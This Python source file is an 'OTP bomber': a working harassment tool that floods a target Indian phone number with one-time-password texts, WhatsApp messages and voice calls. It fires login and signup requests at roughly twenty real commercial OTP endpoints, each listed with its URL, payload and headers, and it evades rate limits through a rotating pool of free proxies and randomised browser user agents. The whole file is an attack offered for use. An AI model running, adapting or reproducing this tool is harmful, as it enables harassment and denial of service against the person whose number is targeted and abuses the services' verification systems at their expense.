"""
OTP Bomber — tapas.py
=====================
Auto-rotating proxy pool using free public proxy APIs.
No configuration needed — proxies are fetched and tested at runtime.
"""

import asyncio
import aiohttp
import random
import logging
import time as _time
import re
from typing import Optional

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# ─── FREE ROTATING PROXY POOL ─────────────────────────────────────────────────
#
#  Fetches fresh proxies from multiple free public APIs (no API key needed).
#  Tests each proxy before adding to the active pool.
#  Rotates through working proxies per-request.
#  Auto-refreshes pool when proxies die.
# ═══════════════════════════════════════════════════════════════════════════════

PROXY_SOURCES = [
    # ProxyScrape — Indian + global HTTP proxies
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all",
    # ProxyScrape global fallback
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=6000&country=IN,US,SG,GB&ssl=all&anonymity=elite",
    # ProxyList.to
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=IN",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite&country=IN",
    # GeoNode free proxies
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
]

TEST_URL     = "https://httpbin.org/ip"
PROXY_TIMEOUT = 8      # seconds to test each proxy
MIN_POOL_SIZE = 5      # keep at least this many working proxies
REFRESH_EVERY = 300    # seconds between pool refreshes


class ProxyPool:
    def __init__(self):
        self._pool:     list[str] = []
        self._bad:      set[str]  = set()
        self._idx:      int       = 0
        self._last_refresh: float = 0.0
        self._refreshing: bool    = False
        self._lock = asyncio.Lock()

    async def _fetch_raw(self, session: aiohttp.ClientSession, url: str) -> list[str]:
        """Fetch proxy list from one source, return host:port strings."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                if r.status != 200:
                    return []
                text = await r.text()
        except Exception:
            return []

        proxies = []

        # JSON response (GeoNode format)
        if text.strip().startswith("{"):
            try:
                import json
                data = json.loads(text)
                for item in data.get("data", []):
                    ip   = item.get("ip", "")
                    port = item.get("port", "")
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
            except Exception:
                pass
            return proxies

        # Plain text — one proxy per line (host:port)
        for line in text.splitlines():
            line = line.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$", line):
                proxies.append(line)

        return proxies

    async def _test_proxy(self, proxy: str) -> bool:
        """Return True if proxy can reach the internet within PROXY_TIMEOUT seconds."""
        url = f"http://{proxy}"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(
                    TEST_URL,
                    proxy=url,
                    timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
                    ssl=False,
                ) as r:
                    return r.status == 200
        except Exception:
            return False

    async def refresh(self, force: bool = False):
        """Fetch fresh proxies from all sources, test them, update pool."""
        async with self._lock:
            now = _time.monotonic()
            if not force and (now - self._last_refresh) < REFRESH_EVERY:
                return
            if self._refreshing:
                return
            self._refreshing = True

        logger.info("🔄 Fetching fresh proxy pool …")
        raw: list[str] = []

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                tasks = [self._fetch_raw(s, url) for url in PROXY_SOURCES]
                batches = await asyncio.gather(*tasks, return_exceptions=True)
                for b in batches:
                    if isinstance(b, list):
                        raw.extend(b)

            # Deduplicate
            raw = list({p for p in raw if p not in self._bad})
            random.shuffle(raw)

            # Test up to 40 candidates concurrently
            candidates = raw[:80]
            logger.info(f"🔍 Testing {len(candidates)} proxies …")
            results = await asyncio.gather(
                *[self._test_proxy(p) for p in candidates],
                return_exceptions=True,
            )

            working = [p for p, ok in zip(candidates, results) if ok is True]
            logger.info(f"✅ {len(working)} working proxies found")

            async with self._lock:
                self._pool         = working
                self._idx          = 0
                self._last_refresh = _time.monotonic()
                self._refreshing   = False
        except Exception as exc:
            logger.warning(f"⚠️ Proxy refresh error: {exc}")
            async with self._lock:
                self._refreshing = False

    def next(self) -> Optional[str]:
        """Round-robin next proxy, or None if pool empty."""
        if not self._pool:
            return None
        proxy = self._pool[self._idx % len(self._pool)]
        self._idx += 1
        return proxy

    def mark_bad(self, proxy: str):
        self._bad.add(proxy)
        if proxy in self._pool:
            self._pool.remove(proxy)
        logger.debug(f"🗑 Proxy removed: {proxy} (pool={len(self._pool)})")

    def size(self) -> int:
        return len(self._pool)

    async def ensure_ready(self):
        """Block until pool has at least MIN_POOL_SIZE proxies (or we tried)."""
        if self.size() < MIN_POOL_SIZE:
            await self.refresh(force=True)


# Global proxy pool
_proxy_pool = ProxyPool()


async def refresh_proxy_pool():
    await _proxy_pool.refresh(force=True)
    logger.info(f"🔀 Proxy pool size: {_proxy_pool.size()}")
    return []


# ─── User-Agent Pool ──────────────────────────────────────────────────────────
_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]
_ACCEPT_LANGS = ["en-IN,en;q=0.9,hi;q=0.8", "en-US,en;q=0.9", "hi-IN,hi;q=0.9,en;q=0.8"]

def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── APIS ─────────────────────────────────────────────────────────────────────
#
#  {phone}    = 10-digit   e.g. 9241687408
#  {phone_cc} = +91 prefix e.g. +919241687408
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════
    # 📱  SMS
    # ══════════════════════════════════════════════════════════════════════

    {
        "name": "Paytm",
        "kind": "sms",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "locale": "en_IN", "signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://paytm.com", "Referer": "https://paytm.com/", "X-Channel": "web"},
    },
    {
        "name": "Flipkart",
        "kind": "sms",
        "url": "https://www.flipkart.com/api/4/user/mobilelogin/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "newUser": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.flipkart.com", "Referer": "https://www.flipkart.com/"},
    },
    {
        "name": "Meesho",
        "kind": "sms",
        "url": "https://meesho.com/api/v1/users/otp",
        "method": "POST",
        "json": {"phone_number": "{phone}"},
        "register_json": {"phone_number": "{phone}", "signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.meesho.com", "Referer": "https://www.meesho.com/"},
    },
    {
        "name": "Zepto",
        "kind": "sms",
        "url": "https://node-api.zepto.co.in/v1/user/otp/send",
        "method": "POST",
        "json": {"phone": "{phone}", "type": "LOGIN"},
        "register_json": {"phone": "{phone}", "type": "SIGNUP"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.zepto.co.in", "Referer": "https://www.zepto.co.in/"},
    },
    {
        "name": "Blinkit",
        "kind": "sms",
        "url": "https://blinkit.com/v4/user/generate_otp",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://blinkit.com", "Referer": "https://blinkit.com/", "app_client": "web"},
    },
    {
        "name": "Swiggy",
        "kind": "sms",
        "url": "https://api-order.swiggy.com/auth/v2/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91"},
        "register_json": {"mobile": "{phone}", "country_code": "91", "is_new_user": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/"},
    },
    {
        "name": "Zomato",
        "kind": "sms",
        "url": "https://api.zomato.com/api/v1/user/auth/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": 91},
        "register_json": {"mobile": "{phone}", "country_code": 91, "is_signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.zomato.com", "Referer": "https://www.zomato.com/", "x-zomato-version": "195"},
    },
    {
        "name": "BigBasket",
        "kind": "sms",
        "url": "https://www.bigbasket.com/mapi/v1/user/mobile_verify/?ver=1&aud=online&type=bb",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new_user": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.bigbasket.com", "Referer": "https://www.bigbasket.com/"},
    },
    {
        "name": "Nykaa",
        "kind": "sms",
        "url": "https://www.nykaa.com/api/auth/sendOtp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.nykaa.com", "Referer": "https://www.nykaa.com/"},
    },
    {
        "name": "Ajio",
        "kind": "sms",
        "url": "https://www.ajio.com/api/j/26401/users/token",
        "method": "POST",
        "json": {"loginId": "{phone}", "password": ""},
        "register_json": {"loginId": "{phone}", "password": "", "action": "register"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.ajio.com", "Referer": "https://www.ajio.com/"},
    },
    {
        "name": "JioMart",
        "kind": "sms",
        "url": "https://www.jiomart.com/api/customer/v2/mobile/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}"},
        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.jiomart.com", "Referer": "https://www.jiomart.com/"},
    },
    {
        "name": "Vedantu",
        "kind": "sms",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "SIGNUP"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.vedantu.com", "Referer": "https://www.vedantu.com/"},
    },
    {
        "name": "CountryDelight",
        "kind": "sms",
        "url": "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.countrydelight.in", "Referer": "https://www.countrydelight.in/"},
    },
    {
        "name": "Goibibo",
        "kind": "sms",
        "url": "https://www.goibibo.com/api/gommt/gologin/v1/sendOTP",
        "method": "POST",
        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
        "register_json": {"mobileNo": "{phone}", "countryCode": "+91", "isNew": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.goibibo.com", "Referer": "https://www.goibibo.com/"},
    },
    {
        "name": "PharmEasy",
        "kind": "sms",
        "url": "https://pharmeasy.in/api/auth/v4/sendOtp",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "flow": "signup"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://pharmeasy.in", "Referer": "https://pharmeasy.in/"},
    },
    {
        "name": "UrbanCompany",
        "kind": "sms",
        "url": "https://www.urbancompany.com/v7/consumer/send_otp/",
        "method": "POST",
        "json": {"phone": "{phone}", "dial_code": "+91"},
        "register_json": {"phone": "{phone}", "dial_code": "+91", "is_new_user": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.urbancompany.com", "Referer": "https://www.urbancompany.com/"},
    },
    {
        "name": "MakeMyTrip",
        "kind": "sms",
        "url": "https://www.makemytrip.com/api/mmy/user/login/v1",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True},
        "register_json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True, "isNewUser": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.makemytrip.com", "Referer": "https://www.makemytrip.com/", "dc": "IN", "currency": "INR", "locale": "en-IN"},
    },
    {
        "name": "BookMyShow",
        "kind": "sms",
        "url": "https://in.bookmyshow.com/api/1.0/auth/otplogin",
        "method": "POST",
        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
        "register_json": {"mobileNo": "{phone}", "countryCode": "+91", "isNewUser": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://in.bookmyshow.com", "Referer": "https://in.bookmyshow.com/"},
    },
    {
        "name": "Dunzo",
        "kind": "sms",
        "url": "https://api.dunzo.com/api/auth/otp/",
        "method": "POST",
        "json": {"phone_number": "+91{phone}"},
        "register_json": {"phone_number": "+91{phone}", "is_signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.dunzo.com", "Referer": "https://www.dunzo.com/"},
    },
    {
        "name": "Practo",
        "kind": "sms",
        "url": "https://www.practo.com/api/v1/profiles/otp",
        "method": "POST",
        "json": {"phone_number": "{phone}", "country_code": "+91"},
        "register_json": {"phone_number": "{phone}", "country_code": "+91", "action": "signup"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.practo.com", "Referer": "https://www.practo.com/"},
    },

    # ══════════════════════════════════════════════════════════════════════
    # 💬  WHATSAPP
    # ══════════════════════════════════════════════════════════════════════

    {
        "name": "Paytm-WA",
        "kind": "whatsapp",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "medium": "whatsapp", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "medium": "whatsapp", "locale": "en_IN", "signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://paytm.com", "Referer": "https://paytm.com/", "X-Channel": "web"},
    },
    {
        "name": "Vedantu-WA",
        "kind": "whatsapp",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP_SIGNUP"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.vedantu.com", "Referer": "https://www.vedantu.com/"},
    },
    {
        "name": "Swiggy-WA",
        "kind": "whatsapp",
        "url": "https://api-order.swiggy.com/auth/v2/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91", "channel": "whatsapp"},
        "register_json": {"mobile": "{phone}", "country_code": "91", "channel": "whatsapp", "is_new_user": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/"},
    },

    # ══════════════════════════════════════════════════════════════════════
    # 📞  CALL
    # ══════════════════════════════════════════════════════════════════════

    {
        "name": "Paytm-Call",
        "kind": "call",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "medium": "ivr", "locale": "en_IN"},
        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP", "version": "v1", "medium": "ivr", "locale": "en_IN", "signup": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://paytm.com", "Referer": "https://paytm.com/", "X-Channel": "web"},
    },
    {
        "name": "Vedantu-Call",
        "kind": "call",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE_SIGNUP"},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.vedantu.com", "Referer": "https://www.vedantu.com/"},
    },
    {
        "name": "Swiggy-Call",
        "kind": "call",
        "url": "https://api-order.swiggy.com/auth/v2/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91", "channel": "voice"},
        "register_json": {"mobile": "{phone}", "country_code": "91", "channel": "voice", "is_new_user": True},
        "base_headers": {"Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/"},
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")

# ─── Circuit breaker ──────────────────────────────────────────────────────────
CIRCUIT_THRESHOLD = 3
COOLDOWN_SEC      = 20.0

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}

def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)

def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")

def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"error":true', '"isError":true',
    "invalid mobile", "invalid number", "invalid phone",
    "blocked", "captcha required", "captcha_required",
    "too many request", "rate limit", "rate_limit",
    "bad request", "access denied", "forbidden",
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', "recaptcha", "captcha",
)

_OK_PATTERNS = (
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',
    "otp sent", "otp has been sent", "successfully sent",
    '"message":"otp', '"message":"success"',
    '"nonce":', '"tid":', '"token":', '"requestId":',
    '"contactExist":', '"emailExists":',
    '"statuscode":0', '"statusCode":0', '"code":0',
    '"data":{', '"otpId":',
    "request processed",
    '"otp_reference":', '"reference_id":',
)


def _body_ok(body: str, status: int) -> bool:
    stripped = body.strip()
    if stripped in ("", "(no body)"):
        return False
    low = stripped.lower()
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False
    if low in ("false", "null", "0", "undefined"):
        return False
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True
    if status in (200, 201) and len(stripped) > 15:
        if (stripped.startswith("{") or stripped.startswith("[")) and any(
            h in low for h in ["otp", "sent", "verify", "phone", "mobile",
                               "token", "session", "success", "sms", "message"]
        ):
            return True
    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request (with proxy rotation) ───────────────────────────────

MAX_PROXY_TRIES = 3   # try up to N different proxies per request

async def _fire_single(session_factory, url, method, headers, payload, name):
    """Try the request through up to MAX_PROXY_TRIES proxies, then direct."""
    timeout = aiohttp.ClientTimeout(total=14, connect=6)
    kw_base = dict(headers=headers, timeout=timeout, allow_redirects=True)
    if isinstance(payload, dict):
        kw_base["json"] = payload

    tried_proxies: list[str] = []

    for attempt in range(MAX_PROXY_TRIES + 1):  # +1 for direct fallback
        proxy: Optional[str] = None
        if attempt < MAX_PROXY_TRIES:
            p = _proxy_pool.next()
            if p and p not in tried_proxies:
                proxy = f"http://{p}"
                tried_proxies.append(p)
            elif not p:
                pass  # pool empty → fall through to direct

        kw = dict(kw_base)
        if proxy:
            kw["proxy"] = proxy

        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        try:
            async with aiohttp.ClientSession(connector=connector) as s:
                async with getattr(s, method)(url, **kw) as resp:
                    status = resp.status
                    try:
                        raw     = await asyncio.wait_for(resp.read(), timeout=6)
                        snippet = raw[:600].decode("utf-8", errors="replace")
                    except Exception:
                        snippet = "(no body)"
            ok = _body_ok(snippet, status)
            if ok:
                return ok, status, snippet
            # 403/0 from this proxy — mark bad and try next
            if proxy and (status in (403, 407) or status == 0):
                raw_proxy = proxy.replace("http://", "")
                _proxy_pool.mark_bad(raw_proxy)
                continue
            return ok, status, snippet
        except asyncio.TimeoutError:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
            if attempt == MAX_PROXY_TRIES:
                return False, 0, "TIMEOUT"
            continue
        except Exception as exc:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
            if attempt == MAX_PROXY_TRIES:
                return False, -1, str(exc)[:120]
            continue

    return False, -1, "ALL_PROXIES_FAILED"


# ─── Fire one API: LOGIN + SIGNUP in parallel ─────────────────────────────────

MAX_RETRIES = 2

async def call_api(session_factory, api: dict, phone: str):
    name     = api["name"]
    kind     = api.get("kind", "sms")
    icon     = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc = f"+91{phone}"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skipping")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url    = _substitute(api["url"], phone, phone_cc)
    method = api["method"].lower()

    def _make_headers():
        h = dict(api.get("base_headers", {}))
        h["User-Agent"]      = _rand_ua()
        h["Accept"]          = "application/json, text/plain, */*"
        h["Accept-Language"] = _rand_lang()
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        return _substitute(h, phone, phone_cc)

    login_json    = _substitute(api["json"], phone, phone_cc)
    register_json = _substitute(api.get("register_json", api["json"]), phone, phone_cc)

    for attempt in range(1 + MAX_RETRIES):
        results = await asyncio.gather(
            _fire_single(None, url, method, _make_headers(), login_json,    name),
            _fire_single(None, url, method, _make_headers(), register_json, name),
            return_exceptions=True,
        )

        best_ok = False; best_status = 0; best_snippet = ""
        for r in results:
            if isinstance(r, Exception): continue
            ok, status, snippet = r
            if ok:
                best_ok = True; best_status = status; best_snippet = snippet; break
            if status > best_status:
                best_status = status; best_snippet = snippet

        if best_ok:
            _record_ok(name)
            logger.info(f"✅ {icon}[{name}] HTTP {best_status} | {best_snippet[:180]}")
            return (name, kind, True, best_status, best_snippet[:180])

        if _is_rate_limited(best_snippet, best_status):
            _record_fail(name)
            if attempt < MAX_RETRIES:
                await asyncio.sleep(random.uniform(0.5, 1.5))
                continue

        if best_status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
            await asyncio.sleep(random.uniform(0.2, 0.7))
            continue

        logger.info(f"❌ {icon}[{name}] HTTP {best_status} | {best_snippet[:180]}")
        _record_fail(name)
        return (name, kind, False, best_status, best_snippet[:180])

    return (name, kind, False, -1, "EXHAUSTED")


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g[api["kind"]].append(api)
    return g


async def _fire_guaranteed(phone: str, kind_groups: dict):
    tasks   = [call_api(None, api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    kind_success = {"sms": False, "whatsapp": False, "call": False}
    for r in results:
        if isinstance(r, tuple) and r[2] is True:
            kind_success[r[1]] = True

    retry_tasks = []
    for kind, ok in kind_success.items():
        if not ok:
            for api in kind_groups.get(kind, []):
                if not _is_cooled(api["name"]):
                    retry_tasks.append(call_api(None, api, phone))
                    break

    extra = []
    if retry_tasks:
        extra = await asyncio.gather(*retry_tasks, return_exceptions=True)
    return list(results) + extra


# ─── Main bombing engine ───────────────────────────────────────────────────────

async def start_bombing(phone: str, rounds: int, progress_callback=None):
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    # Ensure proxy pool ready before we start
    await _proxy_pool.ensure_ready()
    pool_sz = _proxy_pool.size()

    logger.info(
        f"🚀 BOMB START | phone=+91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT}) "
        f"| proxies={pool_sz}"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} (proxy pool: {_proxy_pool.size()}) ──")

        # Refresh proxy pool if running low
        if _proxy_pool.size() < MIN_POOL_SIZE:
            asyncio.ensure_future(_proxy_pool.refresh())

        results    = await _fire_guaranteed(phone, kind_groups)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":        sms_ok  += 1
                elif kind == "whatsapp": wa_ok   += 1
                elif kind == "call":     call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
